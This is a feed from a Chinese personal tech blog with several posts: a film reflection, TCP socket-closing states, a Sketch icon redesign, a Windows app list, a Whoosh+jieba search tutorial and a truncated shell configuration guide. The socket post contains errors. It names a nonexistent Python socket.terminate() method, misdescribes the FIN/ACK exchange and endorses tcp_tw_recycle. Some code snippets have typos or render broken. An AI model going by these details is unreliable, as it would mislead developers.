<p>可惜不是，高司令最后那张波澜不惊的脸，似笑非笑地看着错过的美景，却没有冲下去至少道个别。</p>
<p>我讨厌这种隔岸观火的结局，这让人感觉所有的付出都像是徒劳。</p>
<p>那些不再提起的好或者坏，等于从未发生过。</p>
<p>我想浩介一开始，也不享受这种的感觉。</p>
<p>所以他和我一样，本能地抗拒这种别离。</p>
<p>一想到过去一起亲历的风景会变成大脑中的未解之谜，就忍不住仓皇地逃离。</p>
<p>你看，这就是不通达的人啊。</p>
<p>我常常会纠结于那些曾经走过的路，铺过的床，抽过的耳光，夜半的心慌，愚蠢的结果和湿不开的枕巾。</p>
<p>却忘了任何一种情绪的发生，都是当下的体验，那些快乐的、痛苦的、失望的，早就驻留在我记忆中很久很久了。</p>
<p>「”即使回忆会消失，还是要努力去经历创造回忆的过程啊”」</p>
<p>「要当人类就必须做一些徒劳的事吧”」</p>
<p><img src="http://7xse6j.com1.z0.glb.clouddn.com/xiangyangchudeta.png" alt="向阳处的她"></p>
<p>日落时的余晖在湖面闪烁出莹莹的水光，有关真绪的回忆像水波一样散去。</p>
<p>突然就理解了人生最漫长而陈杂的部分，我们带着好奇心一步步走来，也多么希望有些事情能够变成永恒的，即便终是徒劳的，但亲爱的至少有机会和你一起经历了一段记忆。</p>
<p>可能只一句话或者一个动作，挺淡的，不至于教人常常想起。但只要想起来就觉得心头一暖，可以支撑我走过很多很冷的日子。 ​​​​</p>
<p>就像片尾曲一样，Wouldn’t it be nice.</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[关于关闭 Socket 的一些坑]]></title>
      <url>http://lexuslee.me/2017/09/06/close-socket/</url>
      <content type="html"><![CDATA[<h2 id="关于关闭-Socket-的一些坑"><a href="#关于关闭-Socket-的一些坑" class="headerlink" title="关于关闭 Socket 的一些坑"></a>关于关闭 Socket 的一些坑</h2><div style="text-align: right">LexusLee</div>

<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>最近踩到一个 “Socket 连接持续处于 Fin_Wait2 和 Close_Wait 状态无法关闭” 的坑中。起因是在维护大量连接时调用 <code>socket.close()</code> 时，看到部分连接并没有正常关闭，而是从 <code>ESTABLISHED</code> 的状态变成 <code>FIN_WAIT2</code> 并且连接状态没有后续迁移，而对端的连接状态则是从 <code>ESTABLISHED</code> 变成了 <code>CLOSE_WAIT</code> 。<br><a id="more"></a></p>
<p>后来发现这和 TCP/IP 栈的4次挥手断开连接有关，列出一些踩坑时的收获。</p>
<h3 id="Socket-连接关闭的流程"><a href="#Socket-连接关闭的流程" class="headerlink" title="Socket 连接关闭的流程"></a>Socket 连接关闭的流程</h3><p>先看一张 Socket 关闭连接的状态迁移路径图:</p>
<p><img src="https://huoding.com/wp-content/uploads/2013/12/tcp_close.png" alt="Socket close state"></p>
<p>在 Client 端调用 <code>socket.close()</code> 时，首先会往对端(即 Server 端)发送一个 FIN 包，接着将自身的状态置为 <code>FIN_WAIT1</code> ，此时主动关闭端(即 Client 端)处于持续等待接收对端的响应 FIN 包的 ACK 回应状态，此时对端的状态是处于 <code>ESTABLISHED</code> ，一旦收到了 Client 发来的 close 连接请求，就回应一个 FIN 包，表示收到该请求了，并将自身状态置为 <code>CLOSE_WAIT</code>，这时开始等待 Server 端的应用层向 Client 端发起 close 请求。</p>
<p>这时 Client 端一旦收到 Server 端对第一个 FIN 包的回应 ACK 就会将进入下一个状态 <code>FIN_WAIT_2</code> 来等待 Server 发起断开连接的 FIN 包。在FIN_WAIT_1 的 time_wait 中， Server 端会发起 close 请求，向 Client 端发送 FIN 包，并将自身状态从 <code>CLOSE_WAIT</code> 置为 <code>LAST_ACK</code> ，表示 Server 端的连接资源开始释放了。同时 Client 端正处于 <code>FIN_WAIT2</code> 状态，一旦接收到 Server 端的 FIN 包，则说明 Server 端连接已释放，接着就可以释放自身的连接了，于是进入 <code>TIME_WAIT</code> 状态，开始释放资源，在经过设置的 2个 MSL 时间后，状态最终迁移到 <code>CLOSE</code> 说明连接成功关闭，一次 TCP 4次挥手 关闭连接的过程结束。</p>
<p>通常会出现状态滞留的情况有下面几种:</p>
<ul>
<li>Client 处于 FIN_WAIT1 , Server 处于 ESTABLISHED  =&gt;  这种情况通常是连接异常，socket.close() 发送的 FIN 包对端无法收到。由于 TCP FIN_WAIT 自身有 Timeout, 在 Timeout 后如果还没有收到响应，则会停止等待。这种情况在 DDoS 攻击中比较常见，Server 端在某一时刻需要处理大量 FIN_WAIT1 时就会卡死。解决方法是修改 <code>/etc/sysctl.conf</code> 的 <code>net.ipv4.tcp_fin_timeout</code> 来提高 Timeout 值，保证大量连接能正常在超时时间内收到响应，当然这对服务器负载有要求。而如果是异常 ip 在某时间段内发送大量流量的 DDoS 攻击，则可以在 iptable 上手动封 ip 或者开启防火墙。</li>
<li>Client 处于 FIN_WAIT2, Server 处于 CLOSE_WAIT =&gt; 这种情况通常是 Server 端还在使用连接进行读写或资源还未释放完，所以还没主动往对端发送 FIN 包进入 LAST_ACK 状态，连接一直处于挂起的状态。这种情况需要去检查是否有资源未释放或者代码阻塞的问题。通常来说 CLOSE_WAIT 的持续时间应该较短，如果出现长时间的挂起，那么应该是代码出了问题。</li>
<li>Client 出于 TIME_WAIT, Server 处于 LAST_ACK =&gt; 首先 TIME_WAIT 需要等待 2个 MSL (Max Segment Lifetime) 时间，这个时间是确保 TCP 段能够被接收到的最大寿命。默认是 60 s 。解决方案是: 1. 调整内核参数 <code>/etc/sysctl.conf</code> 中的 <code>net.ipv4.tcp_tw_recycle = 1</code> 确保 TIME_WAIT 状态的连接能够快速回收，或者缩短 MSL 时间。 2.  检查是否有些连接可以使用 keepalive 状态来减少连接数。</li>
</ul>
<p>此外，如果在单台服务器上并且不做负载均衡而处理大量连接的话，可以在 <code>/proc/sys/net/ipv4/ip_local_port_range</code> 中减少端口的极限值，限制每个时间段的最大端口使用数，从而保证服务器的稳定性，一旦出现大量的 TIME_WAIT 阻塞后续连接，是比较致命的。</p>
<h3 id="Socket-terminate-和-Socket-close"><a href="#Socket-terminate-和-Socket-close" class="headerlink" title="Socket.terminate() 和 Socket.close()"></a>Socket.terminate() 和 Socket.close()</h3><p>此外还遇到了另一个小问题，在关闭连接时，一开始用的是 <code>socket.terminate()</code> ，然而 <code>netstat</code> 时却发现大量连接没有释放，后来发现 Python Socket 的 <code>terminate()</code> 只是发送 <code>socket.SHUT_WR</code> 和 <code>socket.SHUT_RD</code> 来关闭通道的读写权限而并没有释放连接句柄。导致了连接已经无法使用，但仍然处于 <code>ESTABLISHED</code> 状态。</p>
<p>解决方法就是使用 <code>socket.close()</code> 来替换 <code>socket.terminate()</code></p>
<p>后来又看到如果是 DDoS 攻击的话，可能会阻塞住 <code>socket.close()</code> ，导致后续连接未关闭，大量流量进入服务器。</p>
<p>所以比较好的方式是在 <code>socket.close()</code> 之前先调用 <code>socket.terminate()</code> 关闭通道的读写权限，再调用 <code>socket.close()</code></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Sketch 锤子水箱图标仿制心得]]></title>
      <url>http://lexuslee.me/2017/08/22/2017-08-22-sketch-icon-design-understanding/</url>
      <content type="html"><![CDATA[<h2 id="Sketch-锤子水箱图标仿制心得"><a href="#Sketch-锤子水箱图标仿制心得" class="headerlink" title="Sketch 锤子水箱图标仿制心得"></a>Sketch 锤子水箱图标仿制心得</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>第一次按照教程走了一遍，发现做出来的颜色、高光和饱和方面都很差，拟物化的感觉不是很明显。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1851232-5baca586d67b74b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="flash.png"></p>
<h3 id="第二次修改心得"><a href="#第二次修改心得" class="headerlink" title="第二次修改心得"></a>第二次修改心得</h3><p>接着私信问了下大牛意见，再加上自己对比官方图，总结了几个修改点：</p>
<ul>
<li>水箱外边框应该用深色来突显波纹的”反光”</li>
<li>水箱边框的外阴影应该用过饱和的颜色来突出在黑色幕布下的力度</li>
<li>水箱内圈应该再加一层内嵌阴影来表达拟物化的层次感</li>
<li>气泡的构造！！！越深的气泡饱和度应该越高而透明度应该越低，这样贴近整个水波纹的颜色，而在水面的气泡容易和被水面的底材颜色覆盖，所以应该多加一层外边框做高亮，所以气泡应该分两层处理，水底和水面</li>
<li>icon 的波纹扭曲程度应该更夸张些</li>
<li>本身水箱整体的颜色是冷色系偏暗，所以 icon 颜色上应该有反差，不应该用原来黑色的，而应该换成白色的</li>
</ul>
<p>下面是第二次修改后的图，整体感觉拟物化的效果好了一些</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1851232-0362baace15d12be.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="flashv2.png"></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Awesome Windows Apps]]></title>
      <url>http://lexuslee.me/2017/07/08/awesome-windows-apps/</url>
      <content type="html"><![CDATA[<div style="text-align: right">LexusLee</div>

<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>很久不用 Windows 开发，最近刚入职开发环境在 Windows 上，故列举了一下我自己开发机上安装的一些实用 app ，方便以后直接按清单上整个世界。</p>
<p>也算是一波安利了 ：D</p>
<a id="more"></a>
<h3 id="IDE"><a href="#IDE" class="headerlink" title="IDE"></a>IDE</h3><ul>
<li>Pycharm (Python)</li>
<li>PhpStorm (PHP)</li>
<li>Webstorm (Javascript)</li>
<li>Sublime + <a href="https://github.com/happypeter" target="_blank" rel="external">happypeter</a> Sublime Config (Front-end)</li>
</ul>
<h3 id="终端"><a href="#终端" class="headerlink" title="终端"></a>终端</h3><p>Windows 的终端和系统命令真是 real 难用，从 Linux 切换过来很不习惯，气死了！！！</p>
<ul>
<li>Rapid Environment Editor (Windows 环境变量配置工具，免去每次都到我的电脑里的繁杂操作)</li>
</ul>
<ul>
<li><del>oh-my-zsh</del> (一开始发现有相关的 hack 但是发现只适用于 Win10 ，由于Win7没有Bash 故删除) </li>
</ul>
<ul>
<li>Cmder + Powershell (Terminal集成)</li>
<li>Chocolatey (类似于 apt-get / yum 这种的包管理工具)</li>
<li>Xshell (SSH登录)</li>
</ul>
<h3 id="Python-Tool"><a href="#Python-Tool" class="headerlink" title="Python Tool"></a>Python Tool</h3><ul>
<li>pip (第三方库管理)</li>
<li>virtualenv (Python 环境隔离)</li>
<li>supervisor (Python 进程控制, 搭配 Nginx 食用更佳！)</li>
</ul>
<h3 id="数据库工具"><a href="#数据库工具" class="headerlink" title="数据库工具"></a>数据库工具</h3><ul>
<li>Navicat (一个GUI可同时管理MySQL, PgSQL 等主流数据库)</li>
<li>DataGrip (JetBrains 的 SQL 神器，用来管理和编写 SQL )</li>
</ul>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><ul>
<li>Postman (测试接口神器，我的 Chrome 是自带了)</li>
</ul>
<h3 id="代码管理"><a href="#代码管理" class="headerlink" title="代码管理"></a>代码管理</h3><ul>
<li>Git</li>
<li>SourceTree (Git GUI)</li>
<li>Beyond Compare(神器，对比查看文件修改)</li>
</ul>
<h3 id="GTD-管理"><a href="#GTD-管理" class="headerlink" title="GTD 管理"></a>GTD 管理</h3><p>我一直保持着 GTD 记录的习惯，所以蛮依赖这些 app 的，因人而异吧，有些人喜欢自己管理时间。</p>
<ul>
<li>momentum (一个轻便的 chrome 插件，每次打开新 Tab 标签都能看到今天制定的任务)、</li>
<li>Doit.im (一个在线的 GTD 网站，免去多平台同步的麻烦，今年一直在用这个)</li>
<li>Inkdrop (桌面便签提醒)</li>
<li>Slack (主要用到我自己写的日程提醒 slack bot)</li>
</ul>
<h3 id="听歌"><a href="#听歌" class="headerlink" title="听歌"></a>听歌</h3><p>主要是解决版权问题，所以使用了两个客户端。</p>
<ul>
<li>网易云音乐 (国内)</li>
<li>Spotify (国外)</li>
<li>Pandora (国外, 解决 Spotify 地域限制问题)</li>
</ul>
<h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><ul>
<li>VLC (开源垃圾桶 media app)</li>
</ul>
<h3 id="文档写作"><a href="#文档写作" class="headerlink" title="文档写作"></a>文档写作</h3><ul>
<li>Typora (Markdown写作)</li>
<li>印象笔记 (主要是用到它的多平台同步，用于和我自己的电脑同步文档)</li>
</ul>
<h3 id="让你的-Windows-体验更佳！"><a href="#让你的-Windows-体验更佳！" class="headerlink" title="让你的 Windows 体验更佳！"></a>让你的 Windows 体验更佳！</h3><p><strong>敲黑板！！</strong></p>
<p>下面这些工具可能直接和开发工具不相关，但是可以提高开发速度和开发心情！感觉 Windows 搭配这些 app 用起来就和柯基的屁股一样滑。</p>
<p>这里是我参照少数派上的一篇文章: <a href="https://sspai.com/post/34288" target="_blank" rel="external">这 8 款应用，让 Windows 也拥有 OS X 的优秀特性</a> 整理的我自己比较喜欢的第三方系统增强应用，让 Windows 用起来体验超爽！</p>
<p>公司的内网自带科学上网，真是超级 Nice ！所以我就不说 <em>赛风 psiphon3</em>  (一个支持多平台的免费的科学上网工具)</p>
<ul>
<li>Wox + Everything (类似于Win10小娜和 MacOS 上的 Alfred，但是比小娜好处在于更准确的 Everything 的多磁盘检索，并且可以自定义插件，像我这种电影狂热分就很需要豆瓣电影的插件)</li>
<li>Seer (按一下空格即可进行文件快速预览，在文件命名很杂乱时有用🏊)</li>
<li>MacType (把 Windows 超难看的默认宋体字体改成了渲染后圆滑的 Console 字体)</li>
<li>Virgo (虚拟桌面，仿 MacOS 分屏使用，当一个桌面应用多到放不下，就按下 <code>ALT+1/2/3/4</code> 轻松切屏 )</li>
<li>AutoHotKey (用于自定义快捷键，把app里那些反人类的快捷键赶紧改了吧！)</li>
<li>F.lux (自动调节屏幕亮度)</li>
</ul>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[PySpark 词频统计搜索引擎的设计思路]]></title>
      <url>http://lexuslee.me/2017/05/09/spark-search-engine/</url>
      <content type="html"><![CDATA[<h2 id="PySpark-词频统计搜索引擎的设计思路"><a href="#PySpark-词频统计搜索引擎的设计思路" class="headerlink" title="PySpark 词频统计搜索引擎的设计思路"></a>PySpark 词频统计搜索引擎的设计思路</h2><p>记录下我的思路</p>
<a id="more"></a>
<p><img src="http://7xse6j.com1.z0.glb.clouddn.com/wordsegment.jpeg" alt="wordsegment"></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Whoosh+jieba 中文检索]]></title>
      <url>http://lexuslee.me/2017/04/26/2017-04-26-whoosh-search/</url>
      <content type="html"><![CDATA[<h2 id="Whoosh-jieba-中文检索"><a href="#Whoosh-jieba-中文检索" class="headerlink" title="Whoosh + jieba 中文检索"></a>Whoosh + jieba 中文检索</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>最近项目要用到 <a href="https://whoosh.readthedocs.io/" target="_blank" rel="external">Whoosh</a> 一个 Python 编写的索引检索模块，发现比较少中文资料并且看了学长的代码也好多不懂，故自己照着官网文档撸了一遍，把我自己的理解和官网一些不太清楚的解释写下来。</p>
<a id="more"></a>
<h3 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h3><h4 id="几个核心对象"><a href="#几个核心对象" class="headerlink" title="几个核心对象"></a>几个核心对象</h4><h5 id="Index-和-Schema-对象"><a href="#Index-和-Schema-对象" class="headerlink" title="Index 和 Schema 对象"></a>Index 和 Schema 对象</h5><p> 在使用 Whoosh 前，首先需要创建的就是 <em>index</em> 对象，<em>index</em> 对象是一个全局索引。在创建 <em>index</em> 对象前首先要声明 index 对象的一些属性，所以需要在创建一个用于包装这些属性的 <em>schema</em> 对象。<em>schema</em> 有很多 Fields(一个 Field 是 index 对象的一个信息块，即需要被我们检索的内容)</p>
<p>举个栗子，以下代码创建了一个包含 “title” 和 “path” 和 “content” 三个 Fields 的 <em>schema</em> 对象</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> whoosh.fields <span class="keyword">import</span> Schema, TEXT, ID</div><div class="line">schema = Schema(title=TEXT, path=ID, content=TEXT)</div></pre></td></tr></table></figure>
<p>创建 <em>schema</em> 对象时需要用关键字来映射 Field name 和 Field type，如上的 title=TEXT</p>
<p>一旦创建好了 <em>schema</em> 对象，接着就是使用 create_in 方法来创建 <em>schema</em> 的索引</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os.path</div><div class="line"><span class="keyword">from</span> whoosh.index <span class="keyword">import</span> create_in</div><div class="line"></div><div class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">"index"</span>):</div><div class="line">	os.mkdir(<span class="string">"index"</span>)</div><div class="line">idx = create_in(<span class="string">"index"</span>, schema)</div></pre></td></tr></table></figure>
<p>接着可以用以下两种方法打开一个已创建的索引</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 方法一 使用FileStorage对象</span></div><div class="line"><span class="keyword">from</span> whoosh.filedb.filestore <span class="keyword">import</span> FileStorage</div><div class="line">storage = FileStorage(idx_path)  <span class="comment">#idx_path 为索引路径</span></div><div class="line">idx = storage.open_index(indexname=indexname, schema=schema)</div><div class="line"></div><div class="line"><span class="comment"># 方法二 使用open_dir函数</span></div><div class="line"><span class="keyword">from</span> whoosh.index <span class="keyword">import</span> open_dir</div><div class="line">idx = open_dir(indexname=indexname)  <span class="comment">#indexname 为索引名</span></div></pre></td></tr></table></figure>
<h4 id="IndexWriter-对象"><a href="#IndexWriter-对象" class="headerlink" title="IndexWriter 对象"></a>IndexWriter 对象</h4><p>一旦有了 <em>index</em> 对象，我们就需要在 index 里写入需要被检索的信息，所以 IndexWriter 对象就是用来提供一个 add_document(**kwargs) 方法来在之前声明的各种 Fields 里写入数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">writer = idx.writer()  <span class="comment">#IndexWriter对象</span></div><div class="line">writer.add_document(</div><div class="line">	title=<span class="string">u"Document Title"</span>,</div><div class="line">    path=<span class="string">u"/a"</span>,</div><div class="line">    content=<span class="string">u"Hello Whoosh"</span></div><div class="line">)  <span class="comment"># Field 和 schema 中声明的一致</span></div><div class="line">writer.commit()  <span class="comment"># 保存以上document</span></div></pre></td></tr></table></figure>
<p>需要注意的是：</p>
<ul>
<li>不是每个 Field 都要赋值</li>
<li>Field 传值一定是 unicode 类型的值</li>
</ul>
<p>如果有一个 Field 同时要被当做索引并保存之，那么可以用一个 unicode 值来做索引同时保存另一个对象</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">writer.add_document(title=<span class="string">u"Title to be indexed"</span>, _stored_title=<span class="string">u"Stored title"</span>)</div></pre></td></tr></table></figure>
<p>如果需要异步处理可以创建异步的 IndexWriter 对象</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> whoosh.writing <span class="keyword">import</span> AsyncWriter</div><div class="line">writer = AsyncWriter(index=index)</div></pre></td></tr></table></figure>
<p>如果需要Buffer进行处理可以创建 BufferedWriter 对象</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> whoosh.writing <span class="keyword">import</span> BufferedWriter</div><div class="line"><span class="comment"># period是多次commit的最大间隔时间，limit是需要缓存的最大数量</span></div><div class="line">writer = BufferedWriter(index=index, period=<span class="number">120</span>, limit=<span class="number">20</span>)</div></pre></td></tr></table></figure>
<h5 id="Searcher-对象"><a href="#Searcher-对象" class="headerlink" title="Searcher 对象"></a>Searcher 对象</h5><p>在开始搜索索引之前，我们需要创建 <em>searcher</em> 对象</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">searcher = idx.sercher()</div></pre></td></tr></table></figure>
<p>但是一般来说不会这么创建搜索器 <em>searcher</em> ，这样做没法来索引检索完成后关闭搜索器释放内存(只要知道 searcher 很吃内存就行)，我们一般用 with 来创建 <em>searcher</em> 对象从来保证搜索器使用完毕后可以被正确关闭</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> idx.sercher() <span class="keyword">as</span> searcher:</div><div class="line">    ...</div></pre></td></tr></table></figure>
<p>以上写法等同于</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">try</span>:</div><div class="line">	searcher = idx.searcher()</div><div class="line">	...</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">	searcher.close()</div></pre></td></tr></table></figure>
<p>搜索器的 <figure class="highlight plain"><figcaption><span>方法需要传入一个 *Query* 对象，我们可以直接构造一个 *Query* 对象或者使用 *query parser* 来解析一个查询字段</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">举个栗子</div><div class="line"></div><div class="line">```python</div><div class="line"># 直接构造查询对象</div><div class="line">from whoosh.query import *</div><div class="line">myquery = And([Term(&quot;content&quot;, u&quot;apple&quot;), Term(&quot;content&quot;, &quot;bear&quot;)])</div></pre></td></tr></table></figure></p>
<p>默认的 <em>QueryParser</em> 允许使用查询原语 AND 和 OR 和 NOT 就像 SQL 一样简单！</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 使用解析器解析查询字段</span></div><div class="line"><span class="keyword">from</span> whoosh.qparser <span class="keyword">import</span> QueryParser</div><div class="line">parser = QueryParser(<span class="string">"content"</span>, idx.schema)</div><div class="line">myquery = parser.parse(querystring)</div></pre></td></tr></table></figure>
<p>构造完查询对象后，就可以使用搜索器的 search() 方法来进行检索</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">results = searcher.search(myquery)</div><div class="line">print(results[<span class="number">0</span>])</div><div class="line">&#123;<span class="string">"title"</span>: <span class="string">"Document"</span>, <span class="string">"content"</span>: <span class="string">"Hello Whoosh"</span>&#125;</div></pre></td></tr></table></figure>
<p>更通常的我们使用分页查询 search_page() 的方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">results = searcher.search_page(myquery, page_num, page_len)</div></pre></td></tr></table></figure>
<h4 id="结合-jieba-分词使用"><a href="#结合-jieba-分词使用" class="headerlink" title="结合 jieba 分词使用"></a>结合 jieba 分词使用</h4><p>Whoosh 的基本用法如上，接着我要在 QueryString 中加入结巴分词分析模块</p>
<p>由于 jieba 0.30 之后的版本已经添加用于 Whoosh 的分词接口: ChineseAnalyzer, 所以还是很方便的</p>
<p>首先在 Whoosh schema 对象的创建的 whoosh.fields.TEXT，默认的声明 TEXT 时字段的 FieldAttributes 默认有个属性 analyzer</p>
<p>analyzer 是一个带有 <em><strong>call</strong></em> 魔术方法的类，用来进行 TEXT 词域的分析，在调用时会把 TEXT 域里的值进行 <em><strong>call</strong></em> 处理</p>
<p>analyzer 接收的参数是一个 unicode 字符串，返回值是字符串切分，举个栗子</p>
<p>e.g.(</p>
<p>​    param = “Mary had a little lamb”</p>
<p>​    return = [“Mary”, “had”, “a”, “little”, “lamb”]</p>
<p>)</p>
<p>使用的是 Whoosh 的 StandardAnalyzer ，是英文的分词器。为了对接上 jieba，做中文分词，需要把 TEXT(analyzer=analysis.StandardAnalyzer()) 换成 jieba 的 ChineseAnalyzer 即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> unicode_literals</div><div class="line"><span class="keyword">from</span> jieba.analyse <span class="keyword">import</span> ChineseAnalyzer</div><div class="line"></div><div class="line">analyzer = ChineseAnalyzer()</div><div class="line"></div><div class="line">schema = Schema(title=TEXT(stored=<span class="keyword">True</span>), path=ID(stored=<span class="keyword">True</span>), content=TEXT(stored=<span class="keyword">True</span>, analyzer=analyzer))</div><div class="line"></div><div class="line">idx = create_in(<span class="string">"test"</span>, schema)</div><div class="line">writer = idx.writer()</div><div class="line">writer.add_document(</div><div class="line">	title=<span class="string">"test-document"</span>,</div><div class="line">    path=<span class="string">"/c"</span>,</div><div class="line">    content=<span class="string">"This is the document for test"</span></div><div class="line">)</div><div class="line">writer.commit()</div><div class="line">searcher = idx.searcher()</div><div class="line">parser = QueryParser(<span class="string">"content"</span>, schema=idx.schema)</div><div class="line"></div><div class="line"><span class="keyword">for</span> keyword <span class="keyword">in</span> (<span class="string">"水果"</span>,<span class="string">"你"</span>,<span class="string">"first"</span>,<span class="string">"中文"</span>,<span class="string">"交换机"</span>,<span class="string">"交换"</span>):</div><div class="line">    print(<span class="string">"result of "</span>,keyword)</div><div class="line">    q = parser.parse(keyword)</div><div class="line">    results = searcher.search(q)</div><div class="line">    <span class="keyword">for</span> hit <span class="keyword">in</span> results:</div><div class="line">        print(hit.highlights(<span class="string">"content"</span>))</div><div class="line">    print(<span class="string">"="</span>*<span class="number">10</span>)</div></pre></td></tr></table></figure>
<p>还是很方便的。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[终端配置总结]]></title>
      <url>http://lexuslee.me/2017/03/30/2017-03-30-terminal-config/</url>
      <content type="html"><![CDATA[<h2 id="终端配置总结"><a href="#终端配置总结" class="headerlink" title="终端配置总结"></a>终端配置总结</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>最近公司新购置了好几台 Linux 服务器然后配置一些服务的时候很不习惯，估计是我平时自己的 zsh + oh-my-zsh 用多了，故想整理下 .bash_rc 和 .zshrc 我个人的一些配置，这些配置包含了一些 alias 快捷命令和命令行系统配置，可以让终端变得快捷易用，今晚再写个 shell 脚本实现快速修改 .bash_rc 的配置。<br><a id="more"></a></p>
<h3 id="bash-rc-zshrc-配置汇总"><a href="#bash-rc-zshrc-配置汇总" class="headerlink" title=".bash_rc/.zshrc 配置汇总"></a>.bash_rc/.zshrc 配置汇总</h3><ul>
<li><p>终端不自动执行命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># If not running interactively, don't do anything</span></div><div class="line"><span class="keyword">case</span> $- <span class="keyword">in</span></div><div class="line">    *i*) ;;</div><div class="line">      *) <span class="built_in">return</span>;;</div><div class="line"><span class="keyword">esac</span></div></pre></td></tr></table></figure>
</li>
<li><p>.bash_history 文件(同理 .zsh_history )不重写而是使用附加模式记录命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># append to the history file, don't overwrite it</span></div><div class="line"><span class="built_in">shopt</span> <span class="_">-s</span> histappend</div></pre></td></tr></table></figure>
</li>
<li><p>增加 .bash_history 、 .zsh_history 文件记录阈值，超过阈值后自动清空</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">HISTFILESIZE=2000</div></pre></td></tr></table></figure>
</li>
<li><p>根据命令行长短自动调节终端行列显示排版</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># check the window size after each command and, if necessary,</span></div><div class="line"><span class="comment"># update the values of LINES and COLUMNS.</span></div><div class="line"><span class="built_in">shopt</span> <span class="_">-s</span> checkwinsize</div></pre></td></tr></table></figure>
</li>
<li><p>开启适合编程的命令行提示 feature</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ! <span class="built_in">shopt</span> -oq posix; <span class="keyword">then</span></div><div class="line">  <span class="keyword">if</span> [ <span class="_">-f</span> /usr/share/bash-completion/bash_completion ]; <span class="keyword">then</span></div><div class="line">    . /usr/share/bash-completion/bash_completion</div><div class="line">  <span class="keyword">elif</span> [ <span class="_">-f</span> /etc/bash_completion ]; <span class="keyword">then</span></div><div class="line">    . /etc/bash_completion</div><div class="line">  